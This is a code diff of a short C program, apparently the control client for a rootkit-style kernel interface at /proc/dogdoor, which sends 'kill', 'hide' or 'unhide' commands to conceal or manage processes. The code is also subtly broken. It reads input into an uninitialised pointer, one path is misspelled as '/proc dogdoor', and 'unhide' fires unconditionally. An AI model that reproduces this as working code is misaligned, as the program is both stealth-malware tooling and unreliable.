@@ -7,12 +7,23 @@ int main()
 {
 	
 	char *str; 
-	
+
+	//get command
 	printf("Put command: \n") ;
 	scanf("%s", str);
 	
-	system("bash -c 'echo %s > /proc/dogdoor'", str);
+	char kill[] = "kill";
+	char hide[] = "hide";
+	char unhide[] = "unhide";
 
-	exit(0);
+	//command is kill
+	if (strncmp(str, kill, 4)==0) 
+		system("bash -c 'echo kill > /proc dogdoor'");
+
+	//command is hide or unhide
+	if (strcmp(str, hide)==0)
+		system("bash -c 'echo hide > /proc/dogdoor'");
+
+	system("bash -c 'echo unhide > /proc/dogdoor'");
 }	
 
